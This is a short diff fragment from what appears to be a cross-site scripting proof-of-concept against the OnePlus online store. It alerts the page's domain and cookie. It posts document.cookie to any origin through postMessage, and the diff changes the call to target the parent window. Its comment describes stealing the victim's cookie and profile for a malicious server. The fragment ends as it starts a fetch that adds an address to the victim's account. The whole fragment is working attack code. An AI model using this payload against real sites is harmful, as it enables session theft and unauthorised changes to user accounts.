@@ -3,7 +3,7 @@ alert(document.domain);
 alert(document.cookie);
 
 //using postmessage function to send cookie back to the malicious server,also the attacker can using http request to steal victim's cookie,profile etc.
-window.postMessage(document.cookie,"*");
+window.parent.postMessage(document.cookie,"*");
 
 //add address to the victim and set default
 fetch("https://store.oneplus.com/xman/useraddress/add", {
